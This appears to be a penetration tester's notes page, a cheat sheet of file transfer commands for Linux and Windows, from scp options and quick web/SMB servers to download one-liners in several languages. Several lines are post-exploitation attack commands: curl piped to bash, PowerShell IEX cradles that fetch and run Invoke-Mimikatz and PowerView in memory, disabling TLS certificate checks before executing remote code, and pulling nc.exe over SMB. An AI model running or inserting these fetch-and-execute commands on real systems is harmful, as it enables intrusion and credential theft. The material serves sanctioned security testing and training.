---
layout: notes
permalink: /notes/cheat/file/
title: File Transfer Cheat Sheet
---

# File Transfer Cheat Sheet

### Linux Transfer

```bash
#Using Wget
wget https://raw.snip.com/LinEnum.sh -O /tmp/LinEnum.sh

#Using Curl
curl https://raw.snip.com/LinEnum.sh

#Using Curl Fileless
curl https://raw.snip.com/LinEnum.sh | bash

#Using Bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3

#Using SSH
sudo systemctl enable ssh
sudo systemctl start ssh
scp plaintext@192.168.49.128:/root/myroot.txt .
```
### SCP
```bash
#Copy single local file to a remote destination.
scp /path/to/source-file user@host:/path/to/destination-folder/

#Copy single remote file to localhost.
scp user@host:/path/to/source-file /path/to/destination-folder

#Copy single file from one remote server to another.
scp user1@server1:/path/to/file user2@server2:/path/to/folder/

#Copy multiple files with one command.
scp file1.txt file2.txt file3.txt [pete@host.example.com](<mailto:pete@host.example.com>):/home/pete/

#Copy all files of a specific type.
scp /path/to/folder/*.ext user@server:/path/to/folder/

#Copy all files in a folder to a remote server.
scp /path/to/folder/* user@server:/path/to/folder/

#Copy all files in a folder recursively to a remote server.
scp -r /home/user/html/* [jane@host.example.com](<mailto:jane@host.example.com>):/home/jane/backup/

#Use Blowfish
scp -c blowfish user@server:/home/user/file

#Use RC4
scp -c arcfour user@server:/home/user/file

#Use 3des
scp -c 3des user@server:/home/user/file

#Limit bandwidth
scp -l limit username@server:/home/uername/*
scp -l50 user@server:/path/to/file /path/to/folder

#Compression
scp -C user@server:/path/to/file /path/to/folder

#Specify port
scp -P 2222 user@server:/home/jane/file /home/jane/
```
### Linux Servers
```bash
#Python3 Web Server
python3 -m http.server
Python2.7 Web Server
python2.7 -m SimpleHTTPServer

#PHP Web Server
php -S 0.0.0.0:8000

#Ruby Web Server
ruby -run -ehttpd . -p8000

#SMB Server
sudo impacket-smbserver share -smb2support /tmp/smbshare

#SMB Server Authentication
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

#FTP Server
sudo python3 -m pyftpdlib --port 21 --write
```

### Windows Transfer

```powershell
#PowerShell DownloadFile
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

#PowerShell DownloadFileAsync
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

#PowerShell DownloadString Fileless
IEX (New-Object Net.WebClient).DownloadString('https://raw.snip.com/snip/InvokeMimikatz.ps1')

#PowerShell Invoke-WebRequest
Invoke-WebRequest https://raw.snip.com/snip/PowerView.ps1 -OutFile PowerView.ps1

#PowerShell UsingBasicParsing
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

#PowerShell FTP
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftpfile.txt')

#PowerShell SSL Error
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

#SMB
copy \\192.168.220.133\share\nc.exe

#SMB Authentication
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### Code Transfer

```python
#Python2 Download
python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.snip.com/snip/LinEnum.sh", "LinEnum.sh")'

#Python3 Download
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.snip.com/snip/LinEnum.sh", "LinEnum.sh")'
```
```php
#PHP File_get_contents() Download
php -r '$file = file_get_contents("https://raw.snip.com/snip/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

#PHP Fopen() Download
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
```ruby
#Ruby Download
ruby -e 'require "net/http"; File.write("LinEnum.sh",Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
```perl
#Perl Download
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");
```